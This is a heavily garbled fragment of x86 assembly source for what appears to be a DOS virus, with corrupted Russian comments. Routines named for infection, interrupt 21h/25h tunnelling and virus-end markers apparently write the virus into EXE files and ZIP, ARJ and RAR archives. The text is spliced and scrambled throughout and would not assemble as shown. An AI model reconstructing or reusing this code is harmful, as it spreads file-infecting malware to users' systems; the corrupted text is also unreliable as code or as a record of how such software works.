   ax,®¢ à¥:  $retame.9], 'd_flags.1], 80h
ur_    je    ?]PT 2
   GOIN     xor e.lo], cmp     cxur_    je ccess_mor
;    call GOIN     xor d;?ver?
    DONE
  ur_
   je ccess_mor
    call    doss[_hp   pos9el_off_of_lCLE A
;-+--18don't restorA   sh    b ¢ à¥:  ith   DOIF   TE ARJHDIextrn IfIG  ds,   ax,®¢ à¥:  eek_end   a   (HDR> fblic; if f-  p)BUFSIZEfblic; if f-  p ARJHDSIZEMARK
   [o_hp   absr
    call_pos.hi], dx[o_hp   absrmp     axsi
              ax    <  stoW_cx]> -_head_CXf_of_l  TE ARJHD------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel test_size  ;ax-(file_siz   _3F: cs
   ax,    dosx-3)
    p_hp   fn ax
    dec     c    ssh   n i - every ne  dec     cbuf  ;write nSIZEMARbuf [_hp   pos9erite n  ax   c
    mp     delta   p ARJHD    dosx-3)
    _hp   beg a--------Iextrn IfIG  ds,  -------------------------------------------+-
pblabel test_size  ;ax-(file_siz ax,®¢ à¥:  $retame dx, dx
    ah, MININF4h cx, n_the_ce---------ur_    je r
  1ZEM              _heap._c   pop     di
 ctBuf
;ATE RARHDR 1dethe_ce---------ur_    je r
  1ZEMSIZE          _all     segp     worddddNCcmp      á«    doss mov i ax bxe_par_dir]
      buf [_hp   beg  dec     si
        d p_hp   fn  dec     s        mov     di, 2 ;4,2,1
crcpass eqcmp     word[_hp   pos9erite n exit1
    ret
;Ä[ziphdr.zip_loc------------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel test_size  ;ax-(file_sizbfr_42:2
   CLE A
;-<debug_lo, ax
            sub     afile size
    x sub     afile siz
Infec_  reug_lo,irusfr th  x sub     adethe_ce  stoW_ax] ;DDDD  DO
  d     wo201h
     dr.zip_loc---neso------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0F
Infec_  reu dx, dx=>------h cx, nextrn IfIIIG  ds,   ax,
      buf --h cx, eek_cur
sss:
;readÄÄÄÄÄÄÄÄÄÄÄize]+3)------------------------------------------+-

;-+------------------------------_attr RE#ÄÄÄ------------------------------------------+-
pblabel test_size  ;ax-(file_sizbfr_4    ;showush   e.l], 1 .ov?
 -<de0DBde.l], 1 ptr [zigb 1 E
  call    doss[To_hp   rd ax
    dec     cx o_hp   st_]NZ
    non    mov     dx, si
   show_sh   e.  nooall    rzheap+[d_flags.REPT1 a   4b01(3) nee5


    axsi
     call        DOIF Z
 c     c n't close tretu,mov   S  mop (?)
 -retu [objhdr.r.zip_loc---neseso------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0FOM
; or
 ÄÄÄÄÄÄ ne
   dall    call ds
    mov  mov   i
         a  add  dx
    -   a0F;hacct2
pbDONE
      a  add  i
        d8t1
  
       DONE
  ----4
8)+arena    e$ret    ;    call    get_c
  
; rectodx ax,
      buf  _rdstip_loc-- push    wh   ;ch  EXEä ©n    DOIF ax, cx
f_inqfr_    DOIF dr.exe_m._hafcount]SIZEMARKworddd al, byte ÄÄÄÄÄÄÄÄ   Erroret
;-+----ax
    mov DosWrite2
     [      db 1], add     ax, 4fr al, byte ÄÄÄÄÄÄÄÄ 
    ret
;-+----------------DosWrite2
     x-3)
          ÄÄÄ db 1], add    ;    DOIF rt_exe_i------------------------------------------+-
pblabel test_size  ;ax-(file_sizbfr_4A:izbfr_48:e.l], 1 .ov?
 -<de     push'Lme vo'ber
;t    t ;DDDD  DO
  aand ;p     word      ;get Disk spacea     ax,   stdÄÄ cn ax0 ; l;Ä[ziphdr.zipe_i------------------------------------------+-
pblabel test_size  ;ax-(file_sizbfr_67:  0C3h
  show_sh   e.cs
  nd
;§¤¥áì ®âá¥ïâì ¬ «he
,mcb    axsi
 NE ax        call    stosw_sbuf -s sub     aSIZEMARKbxi], dx
;Ä[generate na
     stos.arena FSIZE-0Ah
        sbb ar     al, cl
  cx
     stos.arena FSIZE         call dethe_ce-  al, cl
  cx
     stos.arena FSIZE     al, cl
  cx
   i
    CYCLE   stos.arena FSgna str  dec     si
        CYCLE   stos.arena FSgna str ÄÄÄÄÄÄÄec     si
        CYCLE c stos.arena FSgna str ÄÄ    CYCLdr.zip_loc------------------------------------------------+-

;-+---------------------------   _4BCRC:
    cld
      o_hp   rd áì ®âá¥ïâì ¬ « o_h    -------    _sh   ----------------------------+-

;-+---------------------------   _48:iz   _67:iz   _4A:izcs
  nd
;§¤¥áì0C3h
      _sh   áì ®âá¥ïâì ¬ «he
,mcb    axsi
 xe_SP]
        and    c stos.arena FSIZE-0Ah
    t], ax
    mov ------------d stos.arena FSIZE         call  cx
   i
    CYCLE c stos.arena FSgna str  dec     si
        CYCLE   stos.arena FSgna str ÄÄ    CYCLdr.zip_loc-----. ;CR § ­-he
,mcbsent7D00; has topeáì0C3h
  he
,mcb    axSIZEMARKwords     cx-+------ ¨ .5 xchg    bx, ax
    pu ax b
   [2]l-ÄÄ ot mcb    ax ne     
    s     [xex)/2 ;<i
      ip_es sub     dec     si
      s     mov     word ptr [    DONE
    stos.arena FSIZE-0Ah
    t], ax
    mov ----CLE A
;-+---riginalB_DICTBip_loc------ICH.ASIo------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0F o_h    -- x, nextrn IfIa     ---   si
       f_insert
;Ä     mov       al, [ei
        dinsert
;Ä     mov   ub   [exen    insert
;Ä     mov       a[exen    insert
;Ä     mov   ub   [exen    own
 ax, [   di
 ctBuf
;ATE RARHDR 1  call    DcÄÄÄÄÄÄ   coall     seg          mo
;ss     cx-+------bcur o_hp   st_]    axSIZEMARKwordinsert
;Ä     mov       a[exeulate_crc
 insert
;Ä     mov   ub   [exeulate_cr DONE
  ur_E  c1   
    Ds   [exeulate_cr DONE
  ur_E  c1 S 
    Dp     cx-+------wordinsert
;Ä     mov   I        d;?ver?c
 insert
;Ä     mov   u        d;?ver? DONE
  ur_E  c1 I 
    Ds   [exed;?ver? DONE
  ur_E  c1 u 
    Dp   @ÄÄÄÄÄÄÄÄÄÄÄÄÄ al o_h    f-------------------------------------------------+-

;-+-----------------------------izbfr_4C:izbfr_00:es
 @Cpu ANDT1 ax8        popn    g    sin    DELSor archive ;808        popax, cx
    n    ;  cal   _49       popn       dx cx    ;ÄÄÄÄn    ;ÄÄÄ as
;    bfr_31:es   _31:es   _49:izcs
  n   ? est prblt_i®¢ à¥:  $ret$nfect_timblt_i    cmp     ax, INTERVAL_INFECT l], 1 .ov?
 -EF RELIZ
    jl      error_el], 1ebug
EN@s
  b ¢ à¥:  ithtime
    sudx ax,
      bs:arena    e$ d8t1
  
      -EF 1JC_h   byte ptr dMnt 2  struc
    re2    db   .ov?
 -EF 1J          dosseek@
    call 
      -EF 580 xchg    bx, ax
    pu  [exen    ownoff_of_loc_hdr_.
         
      -EF 5803xchg    bx, ax
    pu  [exe
      -EF 5800xchg    bx, ax
    pu  [exen    ownoff_of_loc_hdr_.
 8    ber ies ic
  [exe
      -EF 5801xchg    bx, ax
    pu  [exe
      -ncti8hf_of_loc_hdr_.
  m_virus_end+30h)/-1chg    bx, ax
    pu  [exe.exe_min_BSS], 0ulate_crc
 xe_par_dir]dim
    call   of_loc_hdr_.es     mp      á«    doss ip_es sp      á«CLE A
;-+---rigp      á«     B)gdata.targetploc_hdr_.es_    arena    e$ret movsb         shr 1
            cx
     st   arena    e$ret mov
           d  in  c    s DONE
    sg    s251
            cx
    DONE
    stos+3]
es ;   call          bx, ax       cxxor ax,ax
 dr.zip_loctime]
    xor    -EF 5801x   lea   eg          mo  pop     bx
  
    pu  [exe
      -EF 5803x   lea   eg          mo  pop   ÄÅÄÄ[process
 _0t -------------------------------------------+-

;-+------------------------------------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0Feek_end
; [exen    own
         pop     bx
  rocesheap dx, dx
 fferp p ARJHD    dos   [o_hp   absr
  l_off_of_loc_hdr_.  [o_hp   absr  cr.exe_par_      mo----------------s
  neek_end
f-------------------------------------------------+-

;-+-----------------------------read_buf?Buf
;ATE RA  dx, dx
    ah, MININF  nd
;§¤¥áì ®âásertap     
    de   word eek_end
; [exe   di
   exe_rle_table-    pop ax
i
    
    de   word l    reax,ax
 rj_co  cx, 
    jmp    ICTIO rxz    ExactPage
    dec     a stosw_sbuf 1ax
    sub     _cur_neg_ax
sub     ICTI+1ax
 DOIF ax, cx
f_in       sto_b    lea     si, arj_h
z    ExactPage
    dec     a stosw_sbuf 1axYCLE NZt1
    retwb --read_buf?Buf
;p     cx
    cd   [o_hp   absr
    call    cbuf [o_hp   absrmp     axÄÅÄÄ[ÄÄÄize]+3)?Buf
;p   f-------?Buf
;ATE RA ICH.ASIoÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄb --read_bufphdr.zipd  in  c    s DONE
  [hp   tp]LE NZd  in  c    s DONE
    stos+2       d;?ver?c
 0c       _heap._c   pop     di
    xchg    ax, cx
    call   pop   .ox', 'i', 't'6BOR1EBOR,sp ;57p ;56¨ .5 xFC51hFC53hFC5    8C   0D8   2Ehrc and Jor tunnbu_       pop   .ox', 'i', 't'6BOR1EBOR,sp ;57p ;56¨ .5 xFC51hFC53hFC5    8 BORLANDORLA8 > strucì       __---nestunnbu_      :izc PKL¢ë¯®«­ï;­ ¤®PK«ìª®etc
¯¥à¢®© ã    ®¢ª¥ =   MASK ARBL ì  push    bx ds
    mov    sh    bx dsosw_sbuf 11G  es,     ax, cx
c
 dup (?)
         dbt1
    ret
;Ä      db        mov   Fca'  sh    bx dsosw_s-EF 1JC_h  ;â¥      ä®àPKç    :1,     
    re2    db   b   .ov?
 -EF 1J         trucì       __---nessh    bx dsosw_s-EF 3305I
;   ;   BOOT- ENDSfile nam  :1,     
    re21h
        lulate_crcEPT 2
     osseek_bof__---nessh    bx_heap._cdsl  ;DS:SI
 us writeunnbu    o21+TUNNshrIZE)8;est_size  ;ax-(fileeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    cmp    o_h
beep                  ;search ar_f_head_size]
   set mov
       d;?ver?
    DONE
    st(08h*4+2)+4
2*= 6)   di, 3
 2h
    
    DONE
    st(13h*4+2)+4
2*= 6)   di, 3
 -1
    DOIF of_l2h
    
    DONE
    st(28h*4+2)+4
2*= 6)   di, 3
 si
 xe_tht - S_t handle:    nooooooooo      mo
s   DONEn
        lea     si, [vir_heap._e;est_size  ;ax-(fileeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee

       d;?ver?
¨ ..F0  :1,     
    re21h   re DosCaTA  cx,   bx_heap._ces    al, cl
  cx
   dall    call nt]
    jmp     doswrite4,2,1
crcpass equ byte pa FC1Ah
        l
    re21h   re sosCaTA  cx,   bx®¢ à¥:  $ret       geopen filffe         jz   
      -nctiEh
        l
    re21h   re he
        cx,   bx_rrorRead
         calu byte pa FC1Ah
        l
    re21h   re sosCaTA  cx,   bxd;?ver?
¨ ..A0  :1,     
    re21h   re DosCions.  dr  
        l­¥ § à ¦ âì äz    Exhe
, shi  jmp     ddd     ; ¨áª«. á®§¤ ¢ ¥¬ë¥ ä ©2
     oss           - S_t handle'  sh    bx dsosw_s- FC51h
         
    re21h'  sh    bx dsosw_s movbx ax -he file dP Pd     dx, dethe_ce-  al, cl
  cx
     ovbx ad -he file dMCB al, cl
  cx
   b     starena FSIZE ad -hFSIZh the file
sh   áì ®âá   aSIZEMARKb FC(m_virus_end+30h)/PT 8
      jz   
      -nctiA0  :1,     
    re21h   re a value tehe file
sh   ­s    stosw
  
      -ncti8hf_of_ll
  cx
   b   m_virus_end+30h)/-1chg       
    re21h   re a ional ory, stores in
         xor  seek_bof    - S_t handle ;  n    ional ory, stores in
         xor  2h
   DONE
  ur_
0ap]  CD
        DO       sub     aSIZEMAR---------ur_ PDBCsh   PageRND_G(m_virus_end+30h)/PT 8
 al, byte ptr [CYCLE NZ
        xo call   of_l all     s





;o21  neo21il>_x bxx    o21+_cx_0
pblabe    lea     sos-11d] -+-
TUNNshrIZEp     ddd  eek_cur
sss:mp     er stru
  iicode, ds   DosCio25G( cx:d      jz   
      s  d8t1
       cx
     ovart1
      d  in  c    s stosw[25h*4w[-88ress-io25Gl>_  stg    s25]pt.filecnt]
        cx
     stg    s25   mov  



; cx:drd_ io25]
        cx
     stg    s25   cr.e in  ea     DON(2EBORLFFC3R1EBORo21+7ORLC7     ;o25ov 25)Gl>_[eo21], [heap] TUNNsh;Ä      db        mmmmmmmm2Eh
        lu_byte    1, 20hFFC3R1EB_0
pblabe    lea             adx-3+5
crcpass equ byte ppppppppp[
puE         call t], ax
    mov ----t], ax
    mov ----   mov     ax, si
te    1, 20hC7    v     ax, si
et
;ÄÄÄn  c   ;o25]
       si
et
;ÄÄÄn  cssh  25]; cxx5_[eo25
Gl>_ss:(  s)IP_SIGN, ZIP
pblabe    lea     si, arj_h
IP_SIGN, Z
crcpass equ b
    mov    sh    bx dss5a     DON(opPU,y, stor
cose   ,yAX)Gl>_[eo25
crcpass equ b
    move in  25_0
pblabe    lea     sos-5
crcpass eq        mov   Fca'
       si
et
;Ä<nds
end
tor
cose   >     ddd  eek_cur
sss:mp     er stru
  iicode, ds  mov ----   mov     ax, oc_hdr_.es       ur   er stru
  iicode, ds   eeee cxxeof(part2)lit ........------------------------------------------+-   eeee
eup-t],ub    -----------------------------------------------------+e

       ®¢ à¥:  $ret$nfect_tim
       ord ptr [   IRUSSTACKS]
        cx
     stx, INTERVAL_INFEC     ;d;hdr cr       cxxor
        cx
   dixehdr.exe_IP], ax
       
      s  d mov
           lea c    ICTIO r         xormov ---- eg   dbt1
   ret
;Ä[ziphhhhh
    cm    - SÄÄÄÄÄÄÄÄÄÄ alÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄb --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stong, t_cpm, 4
  dsosw_sbuf 1919       _heap._cc
 ax, [sertap  nd
fr t      _heap._cc  dx cx   pushena    ng, tptr [rarhdr_heap._c0C
pblabel[ziphhhhh ((w1'
  1
  brarhdr_heap._c0ziphhhhh       0hh ((w1'C_h  b0hh1 ;p0C3h
    t24t ;DDDD  DO
  aand 2
   iÄÄÄ dx cx     ;test
tpCP/Mx_attand AlÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄb --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stonmphdr.zip cx
     st                db 1]reg    sip1chg    bx, ax?
 
    su cx iÄÄÄ alÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄb --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        sto bx,blic; 25rarhdr_heafrarhdr_heap._ceso
;ss     cxÄÄÄÄÄÄÄÄd   s DONE
    stg    s25]pt   s        mov     di, 2 ;IP_SIGN, Z
crcpas cx, -1
       eretwb _22        eretwb _22        eret;.5k*100h = 128sio
;s seg       fdr.zip cx
     st           To_hp   arx_c ÄÄ    CYCLe        9r
pblabel  ;  cal[r_nlI t25h]  read_bufg    s251
              _heafrarhdr_heap._ceso
;s    mov ÄÄÄÄÄÄÄÄd   s DONE
    sg    s251
    EG  es, 2
     aandAHimm     equ 0;      .  es,  mov     cxax, cx
    d
tor
cose              To_hp    es,  movw  es, 2
     aip_es sub   movw  es,    pop     
;s seg       fdr.zipÄÄÄ alÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄb --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stod
tor
cose     es,    pop      strk
pub   [exen    own    strk
pub   [exen    off_of_loc_hdr_.      c st          
puE pop   .ohdr_.      c strk
pub   [exen-----------at BUG)
"25       dd   cal bx,blic; 25rarhdr----at BUG8320H
        
    lea  st                db 1]reg    sisc25 ;-bfr_    320H
         bx, ax?
 
    su cx  r_heap._e;Äte_sizeod
torÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call    cx  r_hrk   ;ss dx, ENDS
     [CYCLE NZ      mo
 DONE
    st   ?
puhdr + 3 ; 0h
   st   ?
pu   mov6t ;DDDD  DO
    stss dx,]   si, VIRU .oha FC4    p     word ptp    .sf_mode.l], 1dr.zip_loc_sign.hi- FC51h     lEELIZr     , nee5pushDRdrSd      word ptdup (?)
 _     ;****** DONE
     (?)
       time]
    xor      st                db 1]reg    sisM
; or
 ÄÄÄÄÄÄ ner       CYCLE c st   u]
   ÄÄÄÄÄÄÄÄÄ; has  fn-retu [objhdr bx, ax?
 
     ;sM
; orffer_sizlit 


heap:
ÄÄÄÄ ner       CYCLE c stdÄÄ cn axr
-r[objhdr bx, ax?
 
     ;ptr to drSh thdÄu    sM
; or--read_buf?tuobjhdr DONE
 SHORT     (?)
 _1_el], 1eDONE
     (?)
   ;Äte_sizeod
torÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call   lÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄb --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call   p0C3h
   has  fnobjhdr bx, axNOSTL21   ;drSd     e              , C7    CC sub                          db 1--read_buf      ÄÄÄ db 1 sub          UN   ; IOCTLe       7    j su0C3h
  dÄÄ cn IOCTLe        xr
-r[ob0C3h
   [objhdr bx, axx?
 
     ;      drSob0C3h
           ;  ;!!!!!!!!!_e;Äte_sizeod
torÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call    cx rk  axxÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

ENFLAGS_ARX =   MASK EN_RELOÄb --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stoterTt_err  
    
     cmpzip_extr0C3h
  dÄÄax

    mov     cxax, cx
et:x ax, SIZEMARKER+SIZEMARKek(size  ÄÄÄÄÄÄÄÄÄÄÄ------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0F
        cmp     [rarhd dsosw_sbuf ; seek_end (e and 0F
        cmp      cxax, cx
p     doswrite    ca] (e and 0F
         es, 2
     ahinfect2
pblk(size
    DOIF NCÄ------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0Fb_dict_offset]
    add  buf ; seek_end (e and 0F   DosWrite    cxax, cx
p     doswriteÄÄÄÄÄÄÄÄÄÄÄÄ]tr0C3h
  dÄÄhp    es, 2
     ahin3F¥áì0C3h
  
    DOIF NCobjhdr bx, axNOSTL21t2
pbl], axt
;; ­¥ ;®¡
   ª  ®è¨  ª    pop  .sf_mode.l], 1 .ov?
[to
To_hp   li]PT e    e-no1:
  ;p     word    p      á«®¢ à¥ÄÄÄÄÄÄÄÄÄÄÄ    time]
   lk(s   vir_hÄ ¢®á    ®¢all SP ¨ ¢¥à­ãá .  ¢?
     su-------------------------------------------+-

;-+-----------------------------read_buf  DcÄÄÄÄÄÄ   c2
     ahin3Ede.l], 12h   ;m[to
To_hp   li]PTact2
pblk(sizee
    DOIF NCÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call   --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        stoall    f_inseSIZEMARKER
         stoallosWrite_shbuf_22 ; dx, bx
    c
;readÄÄÄÄÄÄÄÄÄÄÄize]read(zÄ------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0Fcx, 2Ah         ;SIZE zi
    stosw     ;d;hdr crX:AX=curpos
     IZE zi ds:[si]  IZE zijnÄÄÄÄÄÄdllosWrite_shbuf
    dDR> 0(zÄ------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0Fcx, 2Ah     entral_header
;ÄÄÄÄÄÄ-1ize and 0Fcx, 2Ah      es, 2
     aandÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄl    read_bufÄ------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0Fcx, 2Ah   mov    x,ax (?)
           stoallosWritbuf_22 ;  x, 3E0hc
  c        stoallosWr  es, 2
     aandÄ0¥áì0C3h
  
   read_buf_22 2
     ahinf2¥áì0C3h
  
    D      _heafrarhdr_heap._c  mov     ax, 57    (?)
   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄize and 0FOM
    x sub  2
     aandÄ    OM
    x sub  SIZEMARKER
    div dx, bx
    c
;readÄÄÄÄÄÄÄÄ
   read_b dx, dx
    mNINF  nÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call   --ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call        sto bx  à §¬¥à ®¢¥à_header
;ÄÄÄÄÄÄ2/stream
  _arx_t dx
 lit    xormov    ; ¨áª«. á0f
    sub     ax, ¥à_header
;ÄÄxz    ExactPage
    dectosw  ;ll    r  es,   call    do-1 ;t   xDS
    ent_dire    0¥à_header
;ÄÄxz    ExactPt_exe_in--------s
  nÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
pblabel create_dtim
    call   I
code sege
code se    p   byte public
assume cs:code, ds:code, es:code, ss:code
IFDEF USE_BEEP
public  beep

r
;ÄÄÄÄg    s25ream
  _   ed    call     l bx,blic; 25
  _   e  :near
extrn  Buf
;ATE RA  _   e  :near
extrn                    e  :near
extrnFFFh)
             e  :near
extrn  Dcd_bream
  _       :near
extrn   dostell             :near
extrn   read_buf_22         :near
extrnh  DosSeek_all         :near
extrn   doswrite_from_heap  :near
extrn   EXE_TEST            :nea-------------------------------------------+-
pblabel exe_test  ;-+------- teso---[n        25l]-------+-
pblabel exe_test  ;-+-------e_test  ;-+------- teso------------------------------------------+-
pblabel exe_test  ;-+------- teso------------------------------------------+-
pblabel exe_test  ;-+------- tesoub ráï, ¥á«the file leDS:SI= @b riize_hheso------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0F
Infec_Ab¢¥à_heanextrn IfIIIBufdr.zip cx
  stos+(b riize_hl-b riize_hh)]nd
 ese  virus    v   
hp b ráï, ¥ádr.zip cx
  stos+(b riize_hh-b riize_hh)]nd-----------------------------------------+-
ends
end

INCLUDE ZURICH.ize  ;ax-(file_sizhe dr 
;       25n        ?su-------------------------------------------+-

;-+-----------------------------read_buf
Infec_Ab¢_r¥à_heanextrn IfIIIBufdr.zip_heap._cdsdr.zipInfectTurn
s
 ax, [sertap     
    lal    mov     cx, ax, cx
p      m    ?fr t_  Erov     dsosw_s-EF 3Dinfecms some
 ä ©2
    bx, axNOSTL21t2
pb
;¬®¦¥â ®áë¯ âìáDPBeg    sihp   seek_e 10h
    div   axNt BUG8320H
    e
    push ;hcs:[ErrorRead],®¢ à¥:  $retame.9p      á«    doss m_
   je ccess_mor
       mp      á«    dossur_    je ccess_mor
;  exe_par_dir]sertap     
 ;   mov     cx,  ---t], ax
 t]
        cx
   ur_    je r
  _rel_off_of_l     cx
   ur_    je r
    cr.exe_par_dir]
      cEPT[ To_hp   arx_c 

;   glu áì ®âá   ad_flags], not 20hur_   +5el_11100000YCLE LUNZ
 dflags], not 20hur_   +5el_    mov     RELIZ
;   cccccc;er str: $ret  dx
      ?   ans       ;= firs2
     ahin3       DONE bx, axNOSTL21t2
pb     cx
   ur_    je dev 20 _rel_bff_of_l     cx
   ur_    je dev 20   cr.e f_of_l    dx, bx
    c
;readdir]
      cuf [o
To_hp cmp     ax, [b dsosw_s-EF [o
To_hp cs9erite n exi    cmp     SK have si
 s
; or
      rep 
 _pos.hi], dx
    mo, [b dsosw_scl  SK haveh      _mask
      rep 
 RELIZ
;
    mo, [bobjblk], ax
          ; ¨áª«. ád      DXtra i   ret
rarhdr----at BU      sto_word  2012h       DONE
     2012h       DONE
     cx
   ur_    je  sih            DONE
     ne     x-3)
   ur_   +35h         DONE
 [CYCLE NZ
   10h
    div ;   mov     cx,  ---      mo  pop       _heap._c   pop   , [   di
 ctBuf
;ATE RARHDR 1
   10h
     pop   , [   wo, EM      ,ndd
        db    espop       _heap._c ZIP
pblabe    lea f_in       sto_b   a stosw_sbuf 1axYCLE NZ 
pbt1
    retwb _22  , [   di
   DcÄÄÄÄÄÄ   c [CYCLE NZ      mo

ends
end
   m    ?fr t_  ErD
op
InfectTur s;----------------------------+-
ends
end

INCLUDE ZURICH.ize  ;ax-(file_sizhetef code, ahengxi reread_pushexe-
;    & b ráï, ¥ádr-------------------------------------------+-
pblabel test_size  ;ax-(file_size and 0Fes251
   
      s  db   div dx, bx
        ;Ab¢all            calip_loc_sign.hic do-1  ;(   adddojz)S
     [
 xe_SP]
        and«. ádr_
  .Ab¢all            clo     ax, [b dsosw_s-EF dr_
  .Ab¢all            cmp     ax, [bd  in  c    s st  .Ab¢all  ÄÄÄÄÄÄ]tr   c [CY            ;headerDS:SI
 read_every ne  dec     c [o
To_hp cmp l_off_of_loc_hdr_.ho
To_hp cs9er.exe_par_ heap._c   pop      lea     si, arj_h
z    E]tr   creq_proc
    mov      add  buf ; seek_endYCLE NZt1
    retwb _22     call   pop   ile siz
Infec_Ab¢_r¥à_hea   ; read (    CY                            ;hdr.zip_centr_sign_a     pop    --at BU      f  CYCL    si, [vir_heap._exehdr]
 stosw_sbuf 10G  es,        push    si
                              ;0B)







  ; e.lo], c    ' 't1
         di, (offs db   CYCL          ;nocx, _ï, ¥ádr.zip  LUB_DICTIONARY_ENTRY      bof
po           lastchoos;15_exehdr]
 stosw_sbuf 10G  es,        push    si
                              ;16)







  ; e.lo], c    0      ;u- Aut,im    be     t1
         di    [arjdb   CYCL ;nocx, _ï, ¥ádr.zip  LUB_DICTIONARY_ENTRYcmp     word6NARY_ENTRY        lea      ;b riize_hlb _22  , [   di
 rRead
;
 es,        BU      sto_word 
      cEPT[ To_hp   arx_c 
ÄÄÄ$-1    DONE
     2012h    cccccc;er str: $ret  dx
      ?   ans       ;= firs zip_heap._cdsdr.zipto_word 
      ahin3       DONE NE bx, axNOSTL21t2
pb      [b dsosw_scl  SK haveh      _mask
      rep 
   [b dsosw_sch    dostelb      RELIZ
;
    mo, [b  [b dsosw_sb   SK have si
 s
; or
      rep 
   NZ      mo

ends
to_word 
      a   SK (b ri si
-b riize_hh) CYCLE LU
             xo call   of_l          xo call   of_l    cwG  es,             xchg
    moooooooooord ptr [   b
    moooooooooort_dire    i dx, dx- si
 s
; or   ;= firs zip_heap._cdsdr.zipto_word InfectTurn
    callllllllllax, cx
b    ICTIONARY_ENTRY     ne     mp     cx,-r.Ab¢all            clo         DONE
     ne     x-3)
      .Ab¢all            cmp r.exe_par_dir]     ne     x-3)
      .Ab¢all        ad]         xor      ne     x-3)
      .Ab¢all  every  _rel_bff_of_l         ne     x-3)
      .Ab¢all  every    cr.e f_of_l         ne     aEPT[ To_hp   arx_c    rep 
   [b dsosw_scO
                   di
